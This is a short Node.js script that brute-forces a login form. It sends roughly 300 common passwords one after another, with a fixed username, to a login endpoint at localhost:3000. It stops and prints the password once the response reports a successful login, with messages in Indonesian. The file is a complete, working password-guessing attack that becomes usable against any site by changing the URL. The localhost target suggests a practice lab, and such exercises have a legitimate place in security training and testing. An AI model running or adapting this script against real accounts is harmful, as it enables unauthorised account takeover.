const axios = require('axios');

const passwordList = [
  '1234', 'password', 'password123', 'letmein', 'qwerty', 'abc123', 'welcome', 'admin', '12345',
  '123456', 'monkey', 'iloveyou', 'qwerty123', 'sunshine', 'trustno1', '123123', '123qwe', 'password1',
  'qwertyuiop', 'qazwsx', '1q2w3e4r5t', '123qweasdzx', 'football', 'admin123', 'letmein123', 'welcome123',
  '1qaz2wsx', '1234qwer', '1password', 'password01', '123321', 'qwerty1', 'asdfghjkl', 'letmein1234', 'qwerty1234',
  'qwerty!@#', 'qwert', 'baseball', 'dragon', 'superman', '1234abcd', 'iloveyou123', 'secret', 'welcome1', '1234abcd',
  'starwars', 'password1234', 'password12345', 'dragon123', 'changeme', 'password1!', '12345qwerty', 'iloveyou1',
  '123321', 'password123!', 'letmein1', 'passwordabc', 'admin1234', 'guest', 'qwerty12345', 'abc@1234',
  '1qaz2wsx3edc', 'test1234', 'football1', 'mypass', 'qwerty1@2#', 'loveyou', 'ilove1234', 'princess',
  '1234abc!', 'welcome1234', 'hello123', 'jordan', 'michael', 'superman123', 'tiger', 'sunshine123',
  'abcdef', '121212', 'passw0rd', 'iloveyou1!', '123abc', 'asdf1234', '111111', '1q2w3e4r', 'diamond',
  'welcome1!', 'admin1', '1qaz2wsx3edc4rfv', 'summer', 'fall2019', 'winter2020', 'password!@#',
  'qwertyasdf', '123abc!@#', 'qwert12345', 'dummypassword', 'abcqwert123', 'ashley', 'qwertys', '12345abc',
  'zxcvbnm', 'login123', 'abcd1234', 'qwerty1!', 'adrian', 'password2020', 'password12345!', 'rangers', 
  '1234abcd!', 'monkey123', 'letmein2', 'hunter2', 'princess123', 'sunshine1234', 'p@ssw0rd', 'password1!@',
  'welcome!@#', 'correcthorsebatterystaple', 'asdfasdf', 'test@123', 'zxcvbnm123', 'jessica', 'andrew', 
  'guitar', 'admin@123', 'password321', 'charlie', 'welcome2020', 'ferrari', 'apple123', 'qwertz', 'holiday2020',
  'letmein123!', 'sunshine@2021', 'securepassword', 'julius', 'peter', 'beach2019', 'diamond1234', 'monkey@123',
  '12345qwerty!', 'root123', 'qwertyuiop123', 'qwert@123', 'amanda', 'freedom', 'workhard', 'musiclover', 'qwerty12345',
  'hello12345', 'iloveyou1234!', 'awesome', 'iloveu123', 'happy1234', 'princess1', 'password567', 'letmein!!',
  'football123', 'hello!123', 'abc!1234', 'secure123', 'p@sswrd1', 'flower123', 'london123', 'qwerty@2019',
  'star123', 'china123', 'king1234', 'secret1234', 'sunshine!@', 'qwerty12345!', 'holiday1234', 'qwerty123abc',
  'test123456', 'password1q', '123qweasdzx!@#', '123321qwerty', 'abcabc123', 'zxc12345', 'happy@123',
  'passwordxxx', '12345678', 'letmein12345', 'strongpassword', '2019password', 'qwerty3456', 'lilypad', 
  'mylove123', 'iloveyou2', 'guitar123', 'dragon1', 'bills1234', 'newpassword', 'keyboard123', 'coolguy123',
  'computer1', 'rainbow123', 'bigdaddy', 'happydays', '1234abcd1234', 'qwert123abc', 'platinum123', 'power123',
  'loveyou1234!', 'qwerty345', 'backdoor123', 'october2020', 'apple@123', 'kingslayer123', 'sunset1234',
  'littleone', 'adminpassword', 'jordan123', 'kitten123', 'securepassword1', 'test123abc', 'allgood123',
  '12345qwerty!', 'karen123', 'bypass123', 'kitten2', 'root1234', 'computer1234', 'love!@123', 'driver123', 'jazz123',
  'butterfly123', 'rainbow!@#', 'jessicah123', 'one2three', 'sunflower', 'ilovemom', 'jennifer123', 'help1234', 
  'newyear123', 'adminlogin', 'password12', 'abcd@1234', 'love@12345', 'green12345', 'golden1234', 'truelove123',
  '12345abcde', 'soledad', 'rainbow@123', '123abc123', 'admin123456', 'john123', 'summer1234', 'happy2020',
  'bigred123', 'open123', 'clear123', 'book1234', 'xvxv123', 'secretrules', 'peterpan123', 'junior123',
  'holidays@2021', 'lucky1234', 'applepie123', 'stronglove123', 'breezy2020', 'butterfly!@123', 'babygirl123',
  'greatday123', 'backdoor!@#', 'bigbrother', 'thisispassword123', '123ghjkl', 'startnow123', 'michal123',
  'sunset!@#2021', 'luckyme123', 'greenlife123', 'swing123', 'sunrise1234', 'pink123', 'qwertytest123',
  'pinkflower123', 'mylove@1234', 'newlogin123', 'password2', 'winter12345', 'monkey1234', 'start1234'
];

const username = 'xxxfce';

async function bruteForce() {
  for (let i = 0; i < passwordList.length; i++) {
    const password = passwordList[i];

    try {
      const response = await axios.post('http://localhost:3000/login', {
        username: username,
        password: password
      });

      if (response.data.includes('Login Berhasil')) {
        console.log(`Password ditemukan: ${password}`);
        break;
      } else {
        console.log('Password salah');
      }
    } catch (error) {
      console.error('Terjadi kesalahan:', error);
    }
  }
}

bruteForce();